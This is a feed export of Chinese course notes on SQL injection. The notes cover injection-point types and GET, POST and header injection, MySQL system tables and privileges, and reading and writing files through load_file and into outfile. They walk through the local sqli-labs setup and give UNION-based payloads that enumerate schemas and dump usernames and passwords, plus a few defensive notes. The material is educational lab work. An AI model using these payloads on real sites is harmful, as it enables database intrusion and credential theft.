        <content type="html"><![CDATA[<h1>SQL注入之数据提交方式</h1><h3>GET方式注入</h3><p>get注入方式比较常见，主要是通过url中传输数据到后台，带入到数据库中去执行，可利用联合注入方式直接注入</p><h3>POST方式注入</h3><p>post提交方式主要适用于表单的提交，用于登录框的注入</p><p>方法：利用BurpSuite抓包进行重放修改内容进行，和get差别是需要借助抓包工具进行测试，返回结果主要为代码，也可转化为网页显示</p><h3>Request方式注入</h3><p>概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：<br></p><div data-type="math" data-display="inline" data-text="_REQUEST%EF%BC%88%E8%8E%B7%E5%8F%96GET%2FPOST%2FCOOKIE%EF%BC%89COOKIE%E5%9C%A8%E6%96%B0%E7%89%88%E6%9C%AC%E5%B7%B2%E7%BB%8F%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E4%BA%86%0A"></div>_POST（获取POST传参）<br><div data-type="math" data-display="inline" data-text="_GET%EF%BC%88%E8%8E%B7%E5%8F%96GET%E4%BC%A0%E5%8F%82%EF%BC%89%0A"></div>_COOKIE（获取COOKIE传参）<br>$_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）<p></p><h3>HTTP头注入</h3><p>什么是Header头？</p><p>通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机响应消息。 这两种类型的消息有一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。 HTTP的头域包括通用头，请求头，响应头和实体头四个部分</p><h3>什么是Header头部注入？</h3><p>header注入，该注入是指利用后端验证客户端信息（比如常用的cookie验证）或者通过header中获取客户端的一些信息（比如User-Agent用户代理等其他header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有经过相对应的信息处理所以构成了sql注入。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>3.1SQL注入之数据类型</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.1sql-zhu-ru-zhi-shu-ju-lei-xing/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/3-sql-zhu-ru-di-san-zhang-shu-ju-lei-xing-yu-ti-jiao-fang-shi/3.1sql-zhu-ru-zhi-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之数据类型</h1><h3>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1" target="_blank">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h3>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin" target="_blank">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p><h3>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>"keyword=关键字"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p><h3>(4) xx型注入点</h3><p>其他型：也就是由于SQL语句拼接方式不同，在SQL中的实际语句为：，其本质为（xx') or 1=1 # ）</p><p>常见的闭合符号：'     ''    %     (      {</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs通关</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/sqli-labs-tong-guan/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/sqli-labs-tong-guan/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.yuque.com/attachments/yuque/0/2022/pdf/29430497/1668427767198-b8ded1ca-68e4-413a-a428-16480377bddf.pdf">sqli-labs通关2.0版-学员张坤贡献.pdf</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.5 SQL注入之文件读写</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.5-sql-zhu-ru-zhi-wen-jian-du-xie/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.5-sql-zhu-ru-zhi-wen-jian-du-xie/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之文件读写</h1><h4>文件读写注入的原理</h4><p>就是利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。</p><h4>文件读写注入的条件</h4><p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限</p><p><strong>secure_file_priv选项</strong></p><pre><code>linuxcat  etc/conf<p>win<br>www/mysql / my.ini</p></code><p><code></code></p></pre><p></p><p>show global variables like '%secure%'  查看mysql全局变量的配置</p><p>1、读写文件需要 <code>secure_file_priv</code>权限</p><p><strong><code>secure_file_priv=</code></strong></p><p>代表对文件读写没有限制</p><p><code>secure_file_priv=NULL</code></p><p>代表不能进行文件读写</p><p><code>secure_file_priv=d:/phpstudy/mysql/data</code></p><p>代表只能对该路径下文件进行读写</p><p>2、知道网站绝对路径</p><p>Windows常见：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/52b8185c15804b098e5832e56952f9d5.png" alt="image.png" class="align-none"></p><p>Linux常见：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/c22c368cda784e5ebb911ff0bbd0fa99.png" alt="image.png" class="align-none"></p><p>路径获取常见方式：</p><p>报错显示，遗留文件，漏洞报错，平台配置文件等</p><h4>读取文件</h4><p>使用函数：<code>load_file()</code></p><p>后面的路径可以是单引号，0x，char转换的字符。</p><p>注意：路径中斜杠是/不是\。</p><p>一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置...</p><h4>写入文件</h4><p>使用函数：<code>Into Outfile</code>（能写入多行，按格式输出）和 <code>into Dumpfile</code>（只能写入一行且没有输出格式）</p><p>outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径</p><h1>2.6 SQL注入之基础防御</h1><h3>魔术引号</h3><p>魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。<br>最好在编码时不要转义而在运行时根据需要而转义。</p><p>魔术引号：<br>在php.ini文件内找到</p><pre><code>magic_quotes_gpc = On 开启<p>将其改为</p></code><p><code>magic_quotes_gpc = Off 关闭 </code></p></pre><p></p><h3>内置函数</h3><p>做数据类型的过滤</p><p>is_int()等</p><p>addslashes()</p><p>mysql_real_escape_string()</p><p>mysql_escape_string()</p><h3>自定义关键字</h3><p>str_replace()</p><p>其他安全防护软件 WAF ......</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.4 SQL注入之高权限注入下</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.4-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-xia/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.4-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-xia/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之高权限注入</h1><p>1.注入流程与上节实例相同</p><h4>查询所有数据库名称</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/fdc981b9a55d426f8ac014bb61d6356f.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata</code></pre><h4>查询数据库对应的表名</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/5fd74715c4a24cb8bcebec4a7778a0f1.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=0x74657374</code></pre><h4>查询表名对应的字段名</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/8cbb187549814a32afc2cb0a82b7765b.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7431</code></pre><h4>查询数据</h4><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645010203000/1b9dc7926a544a1197a7f93a5be493d8.png" alt="image.png" class="align-none"></p><pre><code>http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,name,pass%20from%20test.t1</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.3 SQL注入之高权限注入上</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.3-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-shang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.3-sql-zhu-ru-zhi-gao-quan-xian-zhu-ru-shang/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之高权限注入</h1><p>在数据库中区分有数据库系统用户与数据库普通用户,二者的划分主要体现在对一些高级函数与资源表的访问权限上。直白一些就是高权限系统用户拥有整个数据库的操作权限,而普通用户只拥有部分已配置的权限。</p><p>网站在创建的时候会调用数据库链接,会区分系统用户链接与普通用户链接;当多个网站存在一个数据库的时候,root就拥有最高权限可以对多个网站进行管辖,普通用户仅拥有当前网站和配置的部分权限。所以当我们获取到普通用户权限时,我们只拥有单个数据库权限,甚至文件读写失败;取得高权限用户权限，不仅可以查看所有数据库,还可以对服务器文件进行读写操作。</p><h3>多个网站共享mysql服务器</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644922889000/d7033b4a97df430fa52b609e39dff24e.png" alt="image.png" class="align-none"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644922889000/2e40fafad1f84f6f92cc48a4702e3296.png" alt="image.png" class="align-none"></p><h3>MySQL 权限介绍</h3><p>mysql中存在4个控制权限的表，分别为user表，db表，tables_priv表，columns_priv表，<br>我当前的版本mysql 5.7.22 。</p><pre><code>select * from user where user='root' and host='localhost'\G;<pre><code>mysql权限表的验证过程为：先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。通过身份认证后，进行权限分配，按照user，db，tables_priv，columns_priv的顺序进行验证。即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。</code></pre><p>2.1 系统权限表<br>User表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限<br>Db表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库<br>Tables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表<br>Columns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段<br>Procs_priv表：存放存储过程和函数级别的权限</p><ol start="2"><li>MySQL 权限级别分为：<br>全局性的管理权限： 作用于整个MySQL实例级别<br>数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上<br>数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象</li></ol><p>3.查看mysql 有哪些用户：<br>mysql&gt; select user,host from mysql.user;</p><p>4.查看用户对应权限<br>select * from user where user=’root’ and host=’localhost’\G;  #所有权限都是Y ，就是什么权限都有</p><p>5.创建 mysql 用户<br>有两种方式创建MySQL授权用户</p><pre><code>执行create user/grant命令（推荐方式）CREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';通过insert语句直接操作MySQL系统权限表</code></pre><p>6.只提供id查询权限<br>grant select(id) on test.temp to test1@’localhost’ identified by ‘123456’;</p><p>7.把普通用户变成管理员<br>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘test1‘@’localhost’ WITH GRANT OPTION;</p></code><p><code>8.删除用户<br>drop user finley@’localhost’; </code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.2 SQL注入之MYSQL手工注入</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.2-sql-zhu-ru-zhi-mysql-shou-gong-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.2-sql-zhu-ru-zhi-mysql-shou-gong-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之MYSQL手工注入</h1><p>本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。</p><h3>sqli-labs数字型注入</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/a6c51cb8e8ec4a3b8840fa3c8e105f86.png" alt="image.png" class="align-none"></p><p>在url中输入id值，执行查询sql语句。即可得到对应数据</p><p>less-2源码分析：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/d4245f8d3a7b423ebb96ddaa5f894fa8.png" alt="image.png" class="align-none"></p><p>浏览器 进行数据提交  服务器  ：</p><pre><code>get 提交  ：  url   数据长度      速度快       用于： </code><p><code>post 提交 ： 服务器    安全性   数据量 </code></p></pre><p></p><h3>注入流程</h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921498000/708c5f66672d462d8bffd38e68791f2f.png" alt="image.png" class="align-none"></p><h3>注入语句</h3><pre><code>尝试手工注入：        SQL注入：         1.判断有无注入点   and 1 = 1； true         随便输入内容  ==  报错  注入                      ==  没有注入        2.猜解列名数量 order by %20 空格        字段 4个<pre class="line-numbers language-none"><code class="language-none">3.报错，判断回显点 union 4.信息收集   数据库版本 version()  高版本：5.0  系统库： infromation 。。。  数据库名称：database（）  低版本：5.0 5.使用对应SQL进行注入  数据库库名：security. 下一级  infromation_schema.tables 查找表名table_name查询serurity库下面 所有的表名 database（）= 前后 连到一起union select 1,group_concat(table_name),3 from information_schema.tableswhere table_schema=database()表： users如何查询表里面有那些字段？ user 字符 转行 16进制union select 1,group_concat(column_name),3 from information_schema.columnswhere table_name=0x7573657273username  password  字段数据  select username,password from users0x3a  :union select 1,2,(select group_concat(username,0x3a,password)from users)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code><p><code></code></p></pre><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2.1.SQL注入之sqli-labs环境搭建</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.1.sql-zhu-ru-zhi-sqli-labs-huan-jing-da-jian/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/2-sql-zhu-ru-di-er-zhang-jie-mysql-shou-gong-zhu-ru/2.1.sql-zhu-ru-zhi-sqli-labs-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之sqli-labs环境搭建</h1><p>往往很多新手在刚学习SQL注入的时候，都需要拥有一个能SQL注入的网站，需要有<strong>SQL注入点</strong> 的。直接去互联网上找的话对新手未免有点太难了，因此：我们一般都是在本地搭建一个能SQL注入测试的网站，那样我们学习SQL注入就容易多了。</p><p>Sqli-labs是一个印度程序员写的，用来学习<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020" target="_blank">sql注入</a>的一个游戏教程。</p><p>Sqli-labs项目地址—Github获取：<a href="https://github.com/Audi-1/sqli-labs" target="_blank">https://github.com/Audi-1/sqli-labs</a>（在预习资料中有下载好的）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/f0e4cdc9139a41fca432bb51ed8e4d3d.png" alt="image.png" class="align-none"></p><h2>Sqli-labs环境安装</h2><h6>需要安装以下环境</h6><p>apache+mysql+php<br>如果可以的话，推荐在windows和linux下分别安装</p><h3>工具下载链接：</h3><p>链接：<a href="https://pan.baidu.com/s/19om5w_QIK8uGWjhe2_SnXA" target="_blank">https://pan.baidu.com/s/19om5w_QIK8uGWjhe2_SnXA</a><br>提取码：ianb</p><p><strong>安装之前确保本地没有下载mysql服务器！</strong></p><p>下载地址：<a href="https://www.xp.cn/" target="_blank">https://www.xp.cn/</a></p><p>在发放的预习资料里面有下载好的工具：</p><p>解压之后如下图，运行phpstudy_x64.exe:</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/776589a200c541c7ba73896dcc674f95.png" alt="image.png" class="align-none"></p><p>双击第一个运行程序后，出现安装界面，点击下方的“自定义安装”安装在除C盘外的盘符。之后点击立即安装即可。（一定要记住自己的安装目录 ！！！！！！）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/f24dfc2541824962a042c5e499e99202.png" alt="image.png" class="align-none"></p><p>点击安装之后，会出现安装进度条。等待不到1分钟，就会出现安装完成界面。点击安装完成，进入首页。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/9435aede1cbe44c1a9025247ee4a1be1.png" alt="image.png" class="align-none"></p><p>安装完成启动对应服务：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/2b7320469dcd490397a8b8c80f87a5d5.png" alt="image.png" class="align-none"></p><p><strong>需要注意的是：phpstudy自带的php版本过高，不兼容sqli-las靶场中php的版本，需要手动设置为低版本</strong></p><p>点击 软件管理 --&gt; php --&gt; 选择php5.2.17 点击安装 即可</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/ce6504666e5540b1b50f7caa432a0341.png" alt="image.png" class="align-none"></p><p>检查是否更换好：</p><p>点击 网站  --&gt; 管理 --&gt; php版本 --&gt;</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/53c08b3e6036439e82ae50e8e801355f.png" alt="image.png" class="align-none"></p><p>sqli-las下载解压完成后，把解压文件放入phpstudy安装路径下的www文件夹中</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/97f47440dafa4744a07e44ba4e3eda90.png" alt="image.png" class="align-none"></p><p>sqli-labs 正常访问需要连接数据库，设置连接数据库配置文件才能正常连接。</p><p>mysql配置文件在sqli-labs文件中sql-connections</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/a0cf0cd341aa4e10900bdf15a5d2aeef.png" alt="image.png" class="align-none"></p><p>进入sql-connections找到db-creds文件进行配置，phpstudy中默认账号和密码为 root</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/b124f42f95f247238d8fbfbaf20a3a07.png" alt="image.png" class="align-none"></p><p><strong>注意：要想phpstudy中自带mysql正常使用，需确保本地没有下载mysql服务器，如有需要卸载本地mysql服务，防止端口占用！</strong></p><h1>phpstudy连接mysql总是启动了又停止</h1><p>第一种情况可能是端口占用问题，可以选择在phpstudy的MySQL中点击 ‘配置’ 里面更改端口，改成3307即可，不过一般这种情况较少</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/6f223955c9c8430a8324b7681117079d.png" alt="image.png" class="align-none"></p><p>第二种情况就是曾经在电脑上安装过mysql，忘记了的可以在服务里面进行查看，比如：</p><p>如何查看 我的电脑--》右击--》管理--》服务和应用程序--》服务</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/8756981d09ad41a68681b10cef633ce0.png" alt="image.png" class="align-none"></p><p>这时候可以进入win + R输入cmd，最好以管理员的身份进入<br>之后输入 sc delete mysql，做完这一步在进入注册表，彻底删除之前的mysql</p><p>1、HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application\MySQL 目录删除</p><p>2、 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Eventlog\Application\MySQL 目录删除</p><p>3、HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eventlog\Application\MySQL 目录删除</p><p>做完这几步后恭喜你，离成功很近了，再次进入<a href="https://so.csdn.net/so/search?q=phpstudy&amp;spm=1001.2101.3001.7020" target="_blank">phpstudy</a>，在软件管理中删除之前的mysql服务，重新安装自己合适的选项，之后再去首页启动mysql服务就成功啦！</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921485000/fc1e111299b743eb88f56dcf570e8b38.png" alt="image.png" class="align-none"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1.3 SQL注入之MYSQL系统库</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.3-sql-zhu-ru-zhi-mysql-xi-tong-ku/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.3-sql-zhu-ru-zhi-mysql-xi-tong-ku/</url>
      
        <content type="html"><![CDATA[<h3>一.系统库释义</h3><p>提供了访问数据库元数据的方式</p><p>元数据是关于数据库的数据，如数据库名和表名，列的数据类型或访问权限。</p><p>![](file://C:/Users/ZQ/Desktop/SQL%E6%B3%A8%E5%85%A5/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%8A%82/images/f80f75d873150a6c54772108475cfc3.png?lastModify=1644921091)<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921082000/df73281d42e04835b0f70ec0773ec8a8.png" alt="image.png" class="align-none"></p><p>1.<strong>information_schema 库</strong>：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；</p><p>例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。</p><pre><code>SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。<pre><code>TABLES表：提供了关于数据中表的信息。table_nameCOLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name</code></pre></code><p><code></code></p></pre><p></p><p>![](file://C:/Users/ZQ/Desktop/SQL%E6%B3%A8%E5%85%A5/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%8A%82/images/bfae53d5e9624cc36174ec315746044.png?lastModify=1644921091)<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921082000/f60d65e839dc412db97edf87fd572f47.png" alt="image.png" class="align-none"></p><p>2、<strong>performance_schema库</strong>具有87张表。<br>MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。</p><p>3、<strong>mysql库</strong>是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。<br>常用举例：在mysql.user表中修改root用户的密码</p><p>4、<strong>sys库</strong>具有1个表，100个视图。<br>sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。<br>可以查询谁使用了最多的资源，哪张表访问最多等。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1.2 SQL注入之MYSQL语句语法</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.2-sql-zhu-ru-zhi-mysql-yu-ju-yu-fa/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/1-sql-zhu-ru-di-yi-zhang-jie-ji-chu-ru-men/1.2-sql-zhu-ru-zhi-mysql-yu-ju-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1>SQL注入之数据库概述</h1><p>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。</p><h3>关系型数据库</h3><p>关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似</p><p>关系型数据库中表与表之间有很多复杂的关联关系的</p><p>常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。</p><h3>非关系型数据库</h3><p>随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计</p><p>NoSQL数据库适合追求速度和可扩展性，业务多变的场景</p><p><a href="https://db-engines.com/en/ranking" target="_blank">数据库排行：https://db-engines.com/en/ranking</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920636000/061b29bf0a964fc09f9db997b127a63e.png" alt="image.png" class="align-none"></p><h3><strong>数据库服务器层级关系：</strong></h3><p>服务器里面<br>：多个数据库<br>：多个数据表<br>：多个行 列  字段<br>： 数据</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644920636000/4d27fc6e0941461193ba75ebcaafce1b.png" alt="image.png" class="align-none"></p><h3>SQL语句语法回顾：</h3><pre><code> 查询当前数据库服务器所有的数据库        show databases;        选中某个数据库        use 数据库名字 test        查询当前数据库所有的表        show tables；        查询t1表所有数据        查询关键 select         * 所有        from  表名        select * from t1;        条件查询 id=2        where 条件  编程 if（条件 true）{执行}<pre><code>    select * from t1 where id=2；    查询id=2   pass =111    union 合并查询     2个特性：    前面查询的语句 和 后面的查询语句 结果互不干扰！    前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致    * == 3    select id from t1 where id=-1 union select * from t1 where pass =111;    order by 排序    order by 